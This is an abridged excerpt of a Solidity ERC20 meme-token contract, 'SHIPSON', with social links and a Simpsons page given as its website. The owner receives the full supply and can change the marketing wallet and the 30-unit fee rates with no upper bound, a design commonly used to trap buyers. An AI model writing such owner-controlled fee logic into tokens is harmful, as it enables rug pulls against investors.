/**
        twitter
        https://x.com/shipson_coin

        telegram
        https://t.me/Shipsoncoin

        website
        https://www.hulu.com/series/the-simpsons
 * */
...
contract  SHIPSON is ERC20 {
    ...
    address public market = 0x6C611a1ae1E9654CeebB96ffea1c72bc53b872b7;
    uint256 private txone = 30;
    uint256 private txtwo = 30;
     uint256 private swapTokensAtAmount = 2100*10**1 * 10**18;


    constructor() public ERC20("SHIPSON", "SHIPSON",18) {
        ...
        _balances[owner()] = (2100*10**4) * (10**18);
          emit Transfer(address(0), owner(), (2100*10**4) * (10**18));
    }
  ...
  function setmarket(address adr) public onlyOwner(){
    ...
    function settxOneAndTwo(uint _one,uint _two) public onlyOwner(){
      txone = _one;
      txtwo = _two;
  }
